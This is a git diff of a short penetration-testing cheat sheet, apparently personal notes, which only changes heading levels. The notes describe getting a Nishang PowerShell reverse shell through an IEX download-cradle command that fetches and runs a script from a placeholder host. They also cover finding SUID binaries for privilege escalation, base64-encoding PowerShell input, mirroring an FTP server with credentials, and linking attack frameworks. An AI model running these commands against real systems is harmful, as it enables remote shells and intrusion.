@@ -1,7 +1,7 @@
-# Tools & Techniques
+#### Tools & Techniques
 
 
-## Nishang
+# Nishang
 To get a sheel from an entry point where cmd is working or the entry point is a cmd
 
 cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 nishang.ps1
@@ -14,18 +14,16 @@ In cmd:
 powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nishang.ps1')"
 
 
-## Linux
-
+# Linux
 # to list suid binary file:
 find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
 
-## Windows
 
+# Windows
 # to convert in base64 with UTF-16LE encoding
 echo -n "Hello World" | iconv --to-code UTF-16LE | base64 -w 0
 
-## Tools
-
+# Tools
 # Shell and Crack
 Unicorn.py :  https://github.com/trustedsec/unicorn  
 Empire.py  :  https://github.com/EmpireProject/Empire
@@ -37,7 +35,7 @@ zsteg,steghide,binwalk.strings,file,foremost
 
 # Other tools
 readpst,mdb-shell,mdb-sql
-## Techniques
 
+# Techniques
 To download all files from ftp server:
 wget -m --no-passive ftp://username:password@x.x.x.x
